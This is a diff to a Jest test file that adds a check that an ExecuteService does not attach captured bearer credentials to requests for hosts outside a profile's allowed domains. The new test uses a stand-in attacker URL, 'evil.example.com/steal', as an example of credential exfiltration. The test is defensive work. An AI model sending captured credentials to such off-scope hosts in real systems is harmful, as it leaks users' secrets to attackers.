@@ -27,7 +27,9 @@ function makeCredSet(headers: Array<{ name: string; value: string }>): Credentia
 
 function makeService(credOverrides: Partial<Record<string, any>> = {}) {
   const credentialsService = {
-    resolveActiveProfile: jest.fn().mockResolvedValue({ app_id: 'app-1', profile_id: 'quickbooks-sandbox' }),
+    resolveActiveProfile: jest.fn().mockResolvedValue({
+      app_id: 'app-1', profile_id: 'quickbooks-sandbox', target_domains: ['sandbox.qbo.intuit.com'],
+    }),
     findHealthySession: jest.fn().mockResolvedValue({ id: 'sess-1', pod_name: 'pod-1' }),
     touchSessionActivity: jest.fn().mockResolvedValue(undefined),
     getCredentialsForSession: jest.fn().mockResolvedValue(makeCredSet([])),
@@ -137,6 +139,27 @@ describe('ExecuteService.executeFetch — attach_captured_credentials', () => {
     });
 
     expect(forwardedHeaders(fetchMock)).toEqual({ 'content-type': 'application/json' });
+  });
+
+  it('does NOT attach captured credentials for a host outside the profile capture scope', async () => {
+    const fetchMock = mockWorkerFetch();
+    const { service, credentialsService } = makeService({
+      getCredentialsForSession: jest.fn().mockResolvedValue(
+        makeCredSet([{ name: 'authorization', value: 'Intuit_live_bearer_xyz' }]),
+      ),
+    });
+
+    // Attacker-influenced URL on a host NOT in target_domains (['sandbox.qbo.intuit.com']).
+    await service.executeFetch({
+      ...baseParams,
+      request: { url: 'https://evil.example.com/steal', method: 'GET' },
+      attachCaptured: true,
+    });
+
+    // The captured bearer must never be fetched or forwarded off-scope.
+    expect(credentialsService.getCredentialsForSession).not.toHaveBeenCalled();
+    const headers = forwardedHeaders(fetchMock) || {};
+    expect(headers.authorization).toBeUndefined();
   });
 
   it('rejects when merging captured headers exceeds MAX_HEADER_COUNT', async () => {
